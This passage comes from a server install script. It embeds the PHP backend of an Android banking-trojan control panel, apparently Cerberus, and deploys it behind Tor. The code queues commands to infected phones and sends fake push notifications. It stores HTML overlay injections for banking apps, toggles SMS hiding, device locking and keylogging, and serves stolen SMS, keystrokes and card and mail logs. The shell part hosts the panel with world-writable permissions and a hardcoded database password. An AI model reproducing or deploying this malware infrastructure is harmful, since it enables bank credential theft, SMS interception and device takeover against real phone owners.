		$arrayIdBot = explode(",",$idbot);
		foreach($arrayIdBot as $id){
			if(!empty($id)){
				if(preg_match('/autopush/', base64_decode($command))) {
					$statement = $connection->prepare("SELECT * FROM bots WHERE idbot= ?");
					$statement->execute([$id]);
					$iconPush = "";
					foreach($statement as $row){
						$arrayBanks = explode(":",$row['banks']);
						if(empty($arrayBanks[0])){$iconPush = $arrayBanks[1];}else{$iconPush = $arrayBanks[0];}
					}
					if(!empty($iconPush)){
						//TODO WTF?
						$statement = $connection->prepare("SELECT pushTitle, pushText FROM settings WHERE 1");
						$statement->execute([$id]);
						foreach($statement as  $row){
							$command = base64_encode(
								json_encode([
									"name"=>"push",
									"app" => $iconPush,
									"title" => (string)$row['pushTitle'],
									"text" => (string)$row['pushText']
								])
							);
						}
					}
				}
				$statement = $connection->prepare("UPDATE bots SET commands = ? WHERE idbot=?");
				$statement->execute([$command,$id]);
			}
		}
		return json_encode(['message'=>'ok']);
	}

	function editComment($idbot, $comment){
		$connection = self::Connection();
		$connection->exec('SET NAMES utf8');
		$statement = $connection->prepare("UPDATE bots SET comment = ? WHERE idbot=?");
		$statement->execute([ $comment,$idbot]);
		return json_encode(['message'=>'ok']);;
	}

	function editGlobalSettings($arrayUrl, $timeInject, $timeCC, $timeMail, $timeProtect,$updateTableBots, $pushTitle, $pushText){
		$connection = self::Connection();
		$connection->exec('SET NAMES utf8');

		$saveID = $this->shapeSpace_random_string(15);
		$statement = $connection->prepare("UPDATE settings SET saveID = ?, arrayUrl = ?, timeInject = ?, timeCC = ?, timeMail = ?, timeProtect = ?, updateTableBots = ?, pushTitle = ?, pushText = ?  WHERE 1");
		$statement->execute(array($saveID ,$arrayUrl, $timeInject, $timeCC, $timeMail, $timeProtect, $updateTableBots, $pushTitle, $pushText));
		
		return json_encode(['message'=>'ok']);
	}

	function shapeSpace_random_string($length) {
		$characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";	
		$strlength = strlen($characters);
		$random = '';
		for ($i = 0; $i < $length; $i++) {
			$random .= $characters[rand(0, $strlength - 1)];
		}
		return $random;
	}

	function getGlobalSettings(){
        $this->CheckUpdates(); // CHECK UPDATES IN DB
		$connection = self::Connection();
		$connection->exec('SET NAMES utf8');
		$row = $connection->query("SELECT * FROM settings WHERE 1 LIMIT 1")->fetch();
		if (!$row)
			return json_encode(["error"=>"No Data Settings"]);

		return json_encode([
			'arrayUrl'=> (string)$row['arrayUrl'],
			'timeInject' => (string)$row['timeInject'],
			'timeCC' => (string)$row['timeCC'],
			'timeMail' => (string)$row['timeMail'],
			'timeProtect' => (string)$row['timeProtect'],
			'updateTableBots' => (string)$row['updateTableBots'],
			'pushTitle' => (string)$row['pushTitle'],
			'pushText' => (string)$row['pushText'],
			'key' => key,
			'version' => botver
		]);
	}
	
	function editBotSettings($idbot, $hideSMS, $lockDevice, $offSound, $keylogger,$activeInjection){
		$connection = self::Connection();
		$connection->exec('SET NAMES utf8');
		$statement = $connection->prepare("UPDATE settingBots SET hideSMS = ?, lockDevice = ?, offSound = ?, keylogger = ?, activeInjection = ?  WHERE idbot=?");
		$statement->execute([$hideSMS, $lockDevice, $offSound, $keylogger,$activeInjection, $idbot]);
		$statement = $connection->prepare("UPDATE bots SET updateSettings = '1' WHERE idbot=?");
		$statement->execute([$idbot]);
		return json_encode(['message'=>'ok']);
	}

	function getBotSettings($idbot){
		$connection = self::Connection();
		$connection->exec('SET NAMES utf8');
		$logs = [

		];
		$statement = $connection->prepare("SELECT * FROM settingBots WHERE idbot= ? ");
		$statement->execute([$idbot]);
		foreach($statement as  $row){
			$activeInjection = $row['activeInjection'];
			if(substr($activeInjection, 0, 1)==':'){
				$activeInjection = substr($activeInjection, 1);
			}

			$logs["hideSMS"]= (string)$row['hideSMS'];
			$logs["lockDevice"] = (string)$row['lockDevice'];
			$logs["offSound"] = (string)$row['offSound'];
			$logs["keylogger"] = (string)$row['keylogger'];
			$logs["activeInjection"] = $activeInjection;
		}
		$statement = $connection->prepare("SELECT * FROM bots WHERE idbot= ? ");
		$statement->execute([$idbot]);
		if(!empty($logs)){
			foreach($statement as $row){
				$banks = $row['banks'];
				/*if(substr($banks, 0, 1)==':'){
					$banks = 'grabCC:grabMails'.$banks;
				}else{
					$banks = 'grabCC:grabMails:'.$banks;
				}*/
				$logs['banks'] = $banks;
				return json_encode($logs);
			}
		}
		return json_encode(["error"=>"No Data Settings bot"]);
	}


	function getLogsInjections($nameTable, $idbot){ 
		$connection = new PDO('mysql:host='.server.';dbname='.db, user, passwd);
		$connection->exec('SET NAMES utf8');
		if(!empty($idbot)){
			$statement = $connection->prepare("SELECT * FROM $nameTable WHERE idbot = ?");
		}else{
			$statement = $connection->prepare("SELECT * FROM $nameTable");
		}
		$statement->execute(array($idbot));
		$json = [ $nameTable.'s' => []];
		foreach($statement as  $row){
			$json[$nameTable.'s'] []= [
				'idinj' => (string)$row['idinj'],
				'idbot' => (string)$row['idbot'],
				'application' => (string)$row['application'],
				'logs' => (string)$row['logs'],
				'comment' => (string)$row['comment']
			];
		}
		return json_encode($json);
	}

	function editCommentLogsInjections($nameTable, $idinj, $comment){
		$connection = self::Connection();
		$connection->exec('SET NAMES utf8');

		if ( !$this->tableExists($nameTable))
			return json_encode(["error"=>"No Have table - WTF? "]);

		$statement = $connection->prepare("UPDATE $nameTable SET comment = ? WHERE idinj = ?");
		$statement->execute(array($comment, $idinj));
		return json_encode(['message'=>'ok']);
	}

	function deleteLogsInjections($nameTable, $idinj){
		$connection = self::Connection();
		$connection->exec('SET NAMES utf8');
		$statement = $connection->prepare("DELETE FROM $nameTable WHERE idinj = ?");
		$statement->execute([$idinj]);
		return json_encode(['message'=>'ok']);
	}

	function getHtmlInjection(){
		$connection = self::Connection();
		$connection->exec('SET NAMES utf8');
		$statement = $connection->prepare("SELECT app FROM dataInjections");
		$statement->execute();
		$json = ["dataInjections"=>[]]; 
			foreach($statement as  $row){
				// $json['dataInjections'] []= [
				// 	'app'=>$row['app'],
				// 	'html'=>'(strlen((string)$row['html'])>=10 ? "1" : "0")',
				// 	'icon'=>(strlen((string)$row['icon'])>=10 ? "1" : "0")
				// ];
				$json['dataInjections'] []= [
					'app'=>$row['app'],
					'html'=>'1',
					'icon'=>'1'
				];
			}
			return json_encode($json);	
	}
	
	function getHtmlFileOfInject($injectName){
		$connection = self::Connection();
		$connection->exec('SET NAMES utf8');
		$statement = $connection->prepare("SELECT html FROM dataInjections WHERE app = ?");
		$statement->execute([$injectName]);
		$myhtml = ""; 
		foreach($statement as  $row){
			$myhtml = $row['html'];
		}
		return json_encode(['html' => $myhtml]);	
	}

	function addHtmlInjection($app, $html, $icon){
		$connection = self::Connection();
		$connection->exec('SET NAMES utf8');
		$statement = $connection->prepare("SELECT COUNT(app) as cnt FROM dataInjections WHERE app = ?");
		$statement->execute([$app]);
		if ( $statement->fetchColumn() )
			return json_encode(['error'=>'App Exist']);

		
		$statement = $connection->prepare("INSERT INTO dataInjections (app, html, icon, type) VALUE ( ?, ?, ?, 0)");
		$statement->execute([$app, $html, $icon]);
		return json_encode(['message'=>'ok']);
	}

	function deleteHtmlInjection($app){
		$connection = self::Connection();
		$connection->exec('SET NAMES utf8');
		$statement = $connection->prepare("DELETE FROM dataInjections WHERE app = ?");
		$statement->execute([$app]);
		return json_encode(['message'=>'ok']);
	}

	function getLogsSMS($idbot){
		$connection = self::Connection();
		$connection->exec('SET NAMES utf8');

		if (!$this->tableExists("LogsSMS_$idbot"))
			return json_encode(["error"=>"No table"]);

		$statement = $connection->prepare("SELECT * FROM LogsSMS_$idbot");
		$statement->execute([]);
		if ($statement->rowCount() == 0)
			return json_encode(["error"=>"No exist"]);
		$json = ['sms'=>[]];
		foreach($statement as  $row){
			$json['sms'] []= [
				'logs'=>$row['logs'],
				'datetoserver' => (string)$row['datetoserver'],
				'datetodevice'=> (string)$row['datetodevice']
			];
		}
		return json_encode($json);	
	}

	function deleteTable($nameTable){
		$connection = self::Connection();
		$connection->exec('SET NAMES utf8');
		$statement = $connection->prepare("DROP TABLE $nameTable");
		$statement->execute();
		return json_encode(['message'=>'ok']);
	}

	function CleanTable($nameTable){
		$connection = self::Connection();
		$connection->exec('SET NAMES utf8');
		$statement = $connection->prepare("TRUNCATE TABLE $nameTable");
		$statement->execute();
		return json_encode(['message'=>'ok']);
	}

	function getLogsKeylogger($idbot){
		$connection = self::Connection();
		$connection->exec('SET NAMES utf8');

		if (!$this->tableExists("keylogger_$idbot"))
			return json_encode(["error"=>"No table"]);

		$statement = $connection->prepare("SELECT logs FROM keylogger_$idbot");
		$statement->execute([]);
		if ($statement->rowCount() == 0)
			return json_encode(["error"=>"No exist"]);

		$json = []; 
		foreach($statement as  $row){
			$json []= (string)$row['logs'];	
		}
		return json_encode($json);	
	}



	function getLogsBots($table, $idbot){
		$connection = self::Connection();
		$connection->exec('SET NAMES utf8');

		if (!$this->tableExists($table))
			return json_encode(["error"=>"No table"]);

		$statement = $connection->prepare("SELECT logs FROM $table WHERE idbot=?");
		$statement->execute([$idbot]);

		if ($statement->rowCount() == 0)
			return json_encode(["error"=>"No exist"]);

		$json = []; 
			foreach($statement as  $row){
				$arrayLine = explode(":end:", base64_decode($row['logs']));
				foreach($arrayLine as $line){
					if(!empty($line)){
						$json []= base64_encode($line) ;
					}
				}
			}
			return json_encode($json);	
	}

	function delLogsBots($table, $idbot){
		$connection = self::Connection();
		$connection->exec('SET NAMES utf8');

		if (!$this->tableExists($table))
			return json_encode(["error"=>"No table"]);

		$statement = $connection->prepare("DELETE FROM $table WHERE idbot = ?");
		$statement->execute([$idbot]);
		return json_encode(['message'=>'ok']);
	}

}
EOM
echo "$GATE" > /home/sysres/source/restapi/db.php

read -r -d '' CONTROLSQL << EOM
<?php
require_once 'medoo.php';

session_start();

// Using Medoo namespace
use Medoo\Medoo;

$database = new Medoo([
	// required
    'database_type' => 'mysql',
    'database_name' => 'bot',
    'server' => 'localhost',
    'username' => 'non-root',
    'password' => 'yArrAk123'
]);

function getValidDaysSubscribe($infos) {
    $mytime = strtotime($infos) - time();
    if($mytime > 0) {
        return round(abs($mytime)/60/60/24);
    }
    return 0;
}
?>
EOM
echo "$CONTROLSQL" > /home/control/content/config.php

cp -rf /home/sysres/source/gate/* /var/www/html
cp -rf /home/sysres/source/restapi/* /var/www/tor
cp -rf /home/control/ /var/www/tor
cp -rf /home/sysbig/ /

chown -R root:root /sysbig/
chmod -R 777 /sysbig/
chmod -R 777 /var/www/
chown -R root:root /var/www/

nginx -s reload
systemctl restart nginx
systemctl restart tor

sudo apt-get install libc6-dev-i386 lib32z1 openjdk-8-jdk -y
sudo apt install default-jdk -y
sudo apt update && sudo apt install android-sdk -y
cd /home/ ; wget https://dl.google.com/android/repository/sdk-tools-linux-3859397.zip ; unzip sdk-tools-linux-3859397.zip
export PATH=/home/tools:/home/tools/bin:$PATH
update-alternatives --config java

sudo apt install xfce4 xfce4-goodies xorg dbus-x11 x11-xserver-utils -y ; sudo apt install xrdp -y ; sudo adduser xrdp ssl-cert ; sudo systemctl restart xrdp ; sudo ufw allow from 192.168.1.0/24 to any port 3389 ; sudo ufw allow 3389
chmod -R 777 /var/www/

cat /var/lib/tor/cerberus/hostname


apt install imagemagick-6.q16 -y
apt install graphicsmagick-imagemagick-compat -y
apt install imagemagick-6.q16hdri -y
